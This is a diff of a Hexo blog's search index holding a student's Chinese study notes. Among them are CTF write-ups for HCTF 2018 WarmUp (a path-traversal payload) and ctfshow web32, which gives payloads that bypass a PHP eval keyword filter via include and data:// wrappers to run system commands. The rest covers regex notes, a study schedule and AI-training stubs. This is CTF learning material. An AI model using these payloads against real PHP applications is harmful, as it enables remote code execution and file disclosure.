-<h4 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h4><p>使用文件包含解决命令执行题目,通法就是先将include函数包含一个参数传递给要被正则表达式检查的变量,然后再在后半部分,再包含php伪协议给前面部分的include函数读取,达到绕过preg_match并且执行命令的目的.</p>
+    <title>代码审计套路</title>
+    <url>/2025/01/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A5%97%E8%B7%AF/</url>
+    <content><![CDATA[<h3 id="代码审计的一些套路总结"><a href="#代码审计的一些套路总结" class="headerlink" title="代码审计的一些套路总结"></a>代码审计的一些套路总结</h3><h4 id="buuctf-HCTF-2018-WarmUp-strpos-substr截取代码"><a href="#buuctf-HCTF-2018-WarmUp-strpos-substr截取代码" class="headerlink" title="[buuctf] [HCTF 2018]WarmUp strpos&#x2F;substr截取代码"></a>[buuctf] [HCTF 2018]WarmUp strpos&#x2F;substr截取代码</h4><p>首先来看源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">&amp;<span class="variable">$_page</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>特别注意的点就是:</strong><br>这里substr截取代码时的第三个参数是截取代码的长度,第二个参数是开始的长度<br>而巧妙之处就在于:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;?&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>这段代码将page手动加了一个?然后探测?的位置,而在主流编程语言中,字符串位置的参数都是从0开始的,例如我要探测:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mmk&amp;nina?</span><br></pre></td></tr></table></figure>
+<p>这里?的位置在参数8的位置,而截取的时候,长度是8,所以刚好把?前面的截取走了,并没有包含?<br>这里就可以解释为什么buuctf那道题的payloads为:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=hint.php?/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+<p>为什么本应是..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg,还在前面多加了一个&#x2F;,因为函数把?前面的字符全部截取走了,只剩下?和前面多加的&#x2F;以及后面的路径: ..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag,这里的&#x2F;是include的分割符号</p>
+<p><strong>详细见[HCTF 2018]WarmUp1</strong>的wp。</p>
 ]]></content>
       <categories>
-        <category>ctfshow web</category>
+        <category>web安全</category>
       </categories>
       <tags>
-        <tag>命令执行</tag>
+        <tag>代码审计</tag>
       </tags>
   </entry>
   <entry>
@@ -3129,6 +3145,40 @@ class ContextAwareClassifier:
       </tags>
   </entry>
   <entry>
+    <title>命令执行:使用文件包含绕过</title>
+    <url>/2025/01/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<h3 id="ctfshow-web32"><a href="#ctfshow-web32" class="headerlink" title="ctfshow web32"></a>ctfshow web32</h3><h4 id="读题和简单分析"><a href="#读题和简单分析" class="headerlink" title="读题和简单分析:"></a>读题和简单分析:</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里很简单明确:就是把shell flag php 这些关键词全部过滤了,主要是连后引号都过滤了,就不可以使用常规的命令执行了.</p>
+<h4 id="文件包含方法"><a href="#文件包含方法" class="headerlink" title="文件包含方法:"></a>文件包含方法:</h4><p>先说payloads:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(“ls”);?&gt;</span><br><span class="line">/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(“cat flag.php”);?&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="分割符"><a href="#分割符" class="headerlink" title="分割符"></a>分割符</h5><p><strong>&amp;:</strong><br>这里就把这个指令分成了两部分:<br>前面一部分赋值给超全局变量$_GET[‘c’],后面一部分就是另外一段包含代码的对象,并不会赋值给前面的c变量.这两段是完全分开的。<br><strong>?&gt;绕过(这是我的易错点):</strong><br>有个这样的机制:<br>php默认的机制,php中的?&gt;符号前面的字符会自带分号,就绕过了分号”;”,十分巧妙.</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h4><p>使用文件包含解决命令执行题目,通法就是先将include函数包含一个参数传递给要被正则表达式检查的变量,然后再在后半部分,再包含php伪协议给前面部分的include函数读取,达到绕过preg_match并且执行命令的目的.</p>
+]]></content>
+      <categories>
+        <category>ctfshow web</category>
+      </categories>
+      <tags>
+        <tag>命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>挑战杯入门ai</title>
+    <url>/2025/01/18/%E6%8C%91%E6%88%98%E6%9D%AF%E5%85%A5%E9%97%A8ai/</url>
+    <content><![CDATA[<h3 id="初次认识ai模型"><a href="#初次认识ai模型" class="headerlink" title="初次认识ai模型"></a>初次认识ai模型</h3><h4 id="rag模型"><a href="#rag模型" class="headerlink" title="rag模型"></a>rag模型</h4><p>1.全称:<br>检索增强生成（Retrieval Augmented Generation），简称 RAG。</p>
+<h4 id="LLM大模型"><a href="#LLM大模型" class="headerlink" title="LLM大模型"></a>LLM大模型</h4>]]></content>
+      <categories>
+        <category>ai</category>
+      </categories>
+      <tags>
+        <tag>初识ai模型</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>数据库基本概念</title>
+    <url>/2025/01/23/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>命令执行绕过符号总结</title>
     <url>/2025/01/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E7%AC%A6%E5%8F%B7%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h3 id="命令执行绕过符号总结"><a href="#命令执行绕过符号总结" class="headerlink" title="命令执行绕过符号总结"></a>命令执行绕过符号总结</h3><p>在命令执行这种题目中我们总会遇到正则过滤,不得不使用一些特殊符号来绕过,下面是常见的符号和对应的绕过方法:</p>
@@ -3155,21 +3205,23 @@ class ContextAwareClassifier:
       </tags>
   </entry>
   <entry>
-    <title>挑战杯入门ai</title>
-    <url>/2025/01/18/%E6%8C%91%E6%88%98%E6%9D%AF%E5%85%A5%E9%97%A8ai/</url>
-    <content><![CDATA[<h3 id="初次认识ai模型"><a href="#初次认识ai模型" class="headerlink" title="初次认识ai模型"></a>初次认识ai模型</h3><h4 id="rag模型"><a href="#rag模型" class="headerlink" title="rag模型"></a>rag模型</h4><p>1.全称:<br>检索增强生成（Retrieval Augmented Generation），简称 RAG。</p>
-<h4 id="LLM大模型"><a href="#LLM大模型" class="headerlink" title="LLM大模型"></a>LLM大模型</h4>]]></content>
+    <title>日程表</title>
+    <url>/2025/01/16/%E6%97%A5%E7%A8%8B%E8%A1%A8/</url>
+    <content><![CDATA[<h2 id="大一寒假安排"><a href="#大一寒假安排" class="headerlink" title="大一寒假安排"></a>大一寒假安排</h2><h3 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h3><h4 id="1-17"><a href="#1-17" class="headerlink" title="1.17"></a>1.17</h4><p>春秋杯</p>
+<h4 id="1-18"><a href="#1-18" class="headerlink" title="1.18"></a>1.18</h4><p>西湖论剑杯</p>
+<h3 id="日常安排"><a href="#日常安排" class="headerlink" title="日常安排"></a>日常安排</h3><h4 id="上午"><a href="#上午" class="headerlink" title="上午"></a>上午</h4><p>1.6:30起床，8:00开始学习C,先进行计算机二级常识基础的记忆。就半个小时</p>
+<h4 id="中午"><a href="#中午" class="headerlink" title="中午"></a>中午</h4><p>1.学到12:00停手,一直到13:30都是休息时间</p>
+<h4 id="下午"><a href="#下午" class="headerlink" title="下午"></a>下午</h4><p>1.java 2h<br>2.python 2h<br>3.mysql和php交互环境的配置(25.1.17)<br>4.做ctfshow和春秋杯的题,晚上听讲解<br>5.另外就是挑战杯:<br>先看材料,有什么要求,再联系老师交流我想制作一个网页安全的系统,可以怎么入手,<br>这样既把项目做了,又可以学习ctf知识。</p>
+<p>另外别忘了干洗。</p>
+<h3 id="挑战杯项目"><a href="#挑战杯项目" class="headerlink" title="挑战杯项目"></a>挑战杯项目</h3><h4 id="项目简述"><a href="#项目简述" class="headerlink" title="项目简述"></a>项目简述</h4><p>1.大概思路:用mistral作为基本模型,然后使用网安数据集进行训练,制作一个网安大模型,然后写一个网页推理对话程序,在这个LLM里配置RAG,RAG内内使用我自行编撰的网络安全知识库。<br>最后的理想呈现效果就是:可以利用这个网页ai(类似于chatgpt),搞漏洞poc,询问它如何sql注入。</p>
+<h4 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h4><p>1.首先对ai编程的基本逻辑不清楚,LLM,rag等基础概念需要深入了解<br>2.unsloth训练需要学习,以及我们项目的mistral模型,了解什么是模型,人工智能的基本运行逻辑是什么,师傅建议直接使用google colab上面的笔记本,不需要过多配置。<br>3.几个专业术语了解:ollama(管理我创建的模型) gguf(正常模型的量化格式) faiss()<br>4.VPN代理的部署,并非难点,只是需要去落实<br>5.以及chatgpt 4o的使用</p>
+]]></content>
       <categories>
-        <category>ai</category>
+        <category>个人安排</category>
       </categories>
       <tags>
-        <tag>初识ai模型</tag>
+        <tag>大一寒假安排</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>数据库基本概念</title>
-    <url>/2025/01/23/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>新加入的token的初始化相关说明</title>
@@ -3211,25 +3263,6 @@ class ContextAwareClassifier:
       </categories>
       <tags>
         <tag>transformer基本结构</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>日程表</title>
-    <url>/2025/01/16/%E6%97%A5%E7%A8%8B%E8%A1%A8/</url>
-    <content><![CDATA[<h2 id="大一寒假安排"><a href="#大一寒假安排" class="headerlink" title="大一寒假安排"></a>大一寒假安排</h2><h3 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h3><h4 id="1-17"><a href="#1-17" class="headerlink" title="1.17"></a>1.17</h4><p>春秋杯</p>
-<h4 id="1-18"><a href="#1-18" class="headerlink" title="1.18"></a>1.18</h4><p>西湖论剑杯</p>
-<h3 id="日常安排"><a href="#日常安排" class="headerlink" title="日常安排"></a>日常安排</h3><h4 id="上午"><a href="#上午" class="headerlink" title="上午"></a>上午</h4><p>1.6:30起床，8:00开始学习C,先进行计算机二级常识基础的记忆。就半个小时</p>
-<h4 id="中午"><a href="#中午" class="headerlink" title="中午"></a>中午</h4><p>1.学到12:00停手,一直到13:30都是休息时间</p>
-<h4 id="下午"><a href="#下午" class="headerlink" title="下午"></a>下午</h4><p>1.java 2h<br>2.python 2h<br>3.mysql和php交互环境的配置(25.1.17)<br>4.做ctfshow和春秋杯的题,晚上听讲解<br>5.另外就是挑战杯:<br>先看材料,有什么要求,再联系老师交流我想制作一个网页安全的系统,可以怎么入手,<br>这样既把项目做了,又可以学习ctf知识。</p>
-<p>另外别忘了干洗。</p>
-<h3 id="挑战杯项目"><a href="#挑战杯项目" class="headerlink" title="挑战杯项目"></a>挑战杯项目</h3><h4 id="项目简述"><a href="#项目简述" class="headerlink" title="项目简述"></a>项目简述</h4><p>1.大概思路:用mistral作为基本模型,然后使用网安数据集进行训练,制作一个网安大模型,然后写一个网页推理对话程序,在这个LLM里配置RAG,RAG内内使用我自行编撰的网络安全知识库。<br>最后的理想呈现效果就是:可以利用这个网页ai(类似于chatgpt),搞漏洞poc,询问它如何sql注入。</p>
-<h4 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h4><p>1.首先对ai编程的基本逻辑不清楚,LLM,rag等基础概念需要深入了解<br>2.unsloth训练需要学习,以及我们项目的mistral模型,了解什么是模型,人工智能的基本运行逻辑是什么,师傅建议直接使用google colab上面的笔记本,不需要过多配置。<br>3.几个专业术语了解:ollama(管理我创建的模型) gguf(正常模型的量化格式) faiss()<br>4.VPN代理的部署,并非难点,只是需要去落实<br>5.以及chatgpt 4o的使用</p>
-]]></content>
-      <categories>
-        <category>个人安排</category>
-      </categories>
-      <tags>
-        <tag>大一寒假安排</tag>
       </tags>
   </entry>
   <entry>
@@ -3363,24 +3396,6 @@ class ContextAwareClassifier:
       </tags>
   </entry>
   <entry>
-    <title>正则匹配注意点个人笔记</title>
-    <url>/2025/01/14/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%B3%A8%E6%84%8F%E7%82%B9%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h3 id="正则匹配个人易忽略点记录"><a href="#正则匹配个人易忽略点记录" class="headerlink" title="正则匹配个人易忽略点记录"></a>正则匹配个人易忽略点记录</h3><h4 id="标志-模式修正符"><a href="#标志-模式修正符" class="headerlink" title="标志&#x2F;模式修正符"></a>标志&#x2F;模式修正符</h4><h5 id="1-多行修饰符-Multline"><a href="#1-多行修饰符-Multline" class="headerlink" title="1.多行修饰符(Multline)"></a>1.多行修饰符(Multline)</h5><p>与($,^)这两个检查首尾的符号紧密相关,注意点:在默认情况下,它们是默认检查全局，即所有字符的开头和结尾,即使你使用了换行符号,它也不会对首位进行检查。<br>例如表达式: &#x2F;.at(.)?$&#x2F;gm 表示小写字符a后跟小写字符t,末尾可选除换行符外任意字符</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/.at(.)?$/&quot; =&gt; The fat</span><br><span class="line">                cat sat</span><br><span class="line">                on the mat.</span><br></pre></td></tr></table></figure>
-<p>这里只匹配mat<br>但是:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/.at(.)?$/gm&quot; =&gt; The fat</span><br><span class="line">                  cat sat</span><br><span class="line">                  on the mat.</span><br></pre></td></tr></table></figure>
-<p>这里就会把fat,sat,mat都给匹配上</p>
-<p><strong>总结:</strong></p>
-<p>重点就是:m加上后会在每排匹配,没有m只会在全局看尾巴或者开头有没有目标字符。</p>
-]]></content>
-      <categories>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>正则匹配</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>汇编硬件基础</title>
     <url>/2025/03/17/%E6%B1%87%E7%BC%96%E7%A1%AC%E4%BB%B6%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<h1 id="三线概念"><a href="#三线概念" class="headerlink" title="三线概念"></a>三线概念</h1><h2 id="名词辨析"><a href="#名词辨析" class="headerlink" title="名词辨析"></a>名词辨析</h2><ul>
@@ -3407,6 +3422,24 @@ class ContextAwareClassifier:
       </categories>
       <tags>
         <tag>汇编硬件</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>正则匹配注意点个人笔记</title>
+    <url>/2025/01/14/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%B3%A8%E6%84%8F%E7%82%B9%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h3 id="正则匹配个人易忽略点记录"><a href="#正则匹配个人易忽略点记录" class="headerlink" title="正则匹配个人易忽略点记录"></a>正则匹配个人易忽略点记录</h3><h4 id="标志-模式修正符"><a href="#标志-模式修正符" class="headerlink" title="标志&#x2F;模式修正符"></a>标志&#x2F;模式修正符</h4><h5 id="1-多行修饰符-Multline"><a href="#1-多行修饰符-Multline" class="headerlink" title="1.多行修饰符(Multline)"></a>1.多行修饰符(Multline)</h5><p>与($,^)这两个检查首尾的符号紧密相关,注意点:在默认情况下,它们是默认检查全局，即所有字符的开头和结尾,即使你使用了换行符号,它也不会对首位进行检查。<br>例如表达式: &#x2F;.at(.)?$&#x2F;gm 表示小写字符a后跟小写字符t,末尾可选除换行符外任意字符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/.at(.)?$/&quot; =&gt; The fat</span><br><span class="line">                cat sat</span><br><span class="line">                on the mat.</span><br></pre></td></tr></table></figure>
+<p>这里只匹配mat<br>但是:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/.at(.)?$/gm&quot; =&gt; The fat</span><br><span class="line">                  cat sat</span><br><span class="line">                  on the mat.</span><br></pre></td></tr></table></figure>
+<p>这里就会把fat,sat,mat都给匹配上</p>
+<p><strong>总结:</strong></p>
+<p>重点就是:m加上后会在每排匹配,没有m只会在全局看尾巴或者开头有没有目标字符。</p>
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>正则匹配</tag>
       </tags>
   </entry>
   <entry>
@@ -3450,11 +3483,6 @@ if __name__ == &#39;__main__&#39;:
       <tags>
         <tag>数据处理</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>爬虫，寻找数据集入门</title>
-    <url>/2025/03/10/%E7%88%AC%E8%99%AB%EF%BC%8C%E5%AF%BB%E6%89%BE%E6%95%B0%E6%8D%AE%E9%9B%86%E5%85%A5%E9%97%A8/</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>特征工程一致性与持久化</title>
@@ -3556,18 +3584,9 @@ if __name__ == &#39;__main__&#39;:
       </tags>
   </entry>
   <entry>
-    <title>训练</title>
-    <url>/2025/01/22/%E8%AE%AD%E7%BB%83/</url>
-    <content><![CDATA[<h3 id="训练ai"><a href="#训练ai" class="headerlink" title="训练ai"></a>训练ai</h3><h4 id="下载资源"><a href="#下载资源" class="headerlink" title="下载资源"></a>下载资源</h4><p>1.u need to use the google colab<br>2.unsloth notebook:<a href="https://colab.research.google.com/drive/1Ys44kVvmeZtnICzWz0xgpRnrIOjZAuxp">https://colab.research.google.com/drive/1Ys44kVvmeZtnICzWz0xgpRnrIOjZAuxp</a></p>
-<h4 id="dataset"><a href="#dataset" class="headerlink" title="dataset"></a>dataset</h4><img src="/2025/01/22/%E8%AE%AD%E7%BB%83/image-20250122153200433.png" class="" title="image-20250122153200433">
-
-<h4 id="unsloth"><a href="#unsloth" class="headerlink" title="unsloth"></a>unsloth</h4><h4 id="weight"><a href="#weight" class="headerlink" title="weight"></a>weight</h4><h4 id="dataset-processing"><a href="#dataset-processing" class="headerlink" title="dataset processing"></a>dataset processing</h4><h4 id="huggface"><a href="#huggface" class="headerlink" title="huggface"></a>huggface</h4>]]></content>
-      <categories>
-        <category>ai</category>
-      </categories>
-      <tags>
-        <tag>ai训练</tag>
-      </tags>
+    <title>爬虫，寻找数据集入门</title>
+    <url>/2025/03/10/%E7%88%AC%E8%99%AB%EF%BC%8C%E5%AF%BB%E6%89%BE%E6%95%B0%E6%8D%AE%E9%9B%86%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>自然语言处理</title>
@@ -3837,6 +3856,20 @@ if __name__ == &#39;__main__&#39;:
       </categories>
       <tags>
         <tag>transformer模型入门</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>训练</title>
+    <url>/2025/01/22/%E8%AE%AD%E7%BB%83/</url>
+    <content><![CDATA[<h3 id="训练ai"><a href="#训练ai" class="headerlink" title="训练ai"></a>训练ai</h3><h4 id="下载资源"><a href="#下载资源" class="headerlink" title="下载资源"></a>下载资源</h4><p>1.u need to use the google colab<br>2.unsloth notebook:<a href="https://colab.research.google.com/drive/1Ys44kVvmeZtnICzWz0xgpRnrIOjZAuxp">https://colab.research.google.com/drive/1Ys44kVvmeZtnICzWz0xgpRnrIOjZAuxp</a></p>
+<h4 id="dataset"><a href="#dataset" class="headerlink" title="dataset"></a>dataset</h4><img src="/2025/01/22/%E8%AE%AD%E7%BB%83/image-20250122153200433.png" class="" title="image-20250122153200433">
+
+<h4 id="unsloth"><a href="#unsloth" class="headerlink" title="unsloth"></a>unsloth</h4><h4 id="weight"><a href="#weight" class="headerlink" title="weight"></a>weight</h4><h4 id="dataset-processing"><a href="#dataset-processing" class="headerlink" title="dataset processing"></a>dataset processing</h4><h4 id="huggface"><a href="#huggface" class="headerlink" title="huggface"></a>huggface</h4>]]></content>
+      <categories>
+        <category>ai</category>
+      </categories>
+      <tags>
+        <tag>ai训练</tag>
       </tags>
   </entry>
 </search>
